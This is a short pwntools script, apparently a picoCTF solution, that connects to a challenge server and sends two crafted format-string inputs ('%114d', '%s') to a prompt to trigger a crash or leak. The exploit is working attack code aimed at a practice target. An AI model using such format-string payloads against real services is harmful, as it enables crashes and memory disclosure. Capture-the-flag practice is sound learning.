
```python
#!/usr/bin/env python3
from pwn import *
HOST = "mimas.picoctf.net"
PORT = 53794

def main():
    r = remote(HOST, PORT)
    r.recvuntil(b"Enter your recommendation: ")
    r.sendline(b"Gr%114d_Cheese")
    r.recvuntil(b"Enter your recommendation: ")
    r.sendline(b"Cla%sic_Che%s%steak")
    r.interactive()

if __name__ == "__main__":
    main()
```
